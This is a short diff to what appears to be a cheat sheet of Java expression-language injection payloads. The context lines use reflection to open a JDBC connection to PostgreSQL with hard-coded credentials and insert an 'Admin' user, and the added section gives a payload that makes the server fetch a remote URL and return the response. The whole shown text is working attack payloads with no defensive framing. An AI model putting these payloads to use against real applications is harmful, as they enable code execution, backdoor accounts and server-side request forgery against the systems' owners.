@@ -115,3 +115,8 @@ T(java.sql.DriverManager).getConnection('jdbc:postgresql://127.0.0.1:5432/test?u
 
 "".getClass().forName("java.sql.DriverManager").getMethod("getConnection","".getClass()).invoke(null,"jdbc:postgresql://127.0.0.1:5432/test?user=postgres%26password=mysecretpassword").createStatement().executeQuery("INSERT INTO users (name, surname, login, email, password) VALUES ('Admin', 'Admin', 'Admin', 'admin@example.com', 'P@ssw0rd123');")
 ```
+
+## HTTP Request - GET with response
+```java
+"".getClass().forName("java.lang.String").getConstructor("".getClass().forName("[B")).newInstance(new java.net.URL("http://google.com").openStream().readAllBytes())
+```
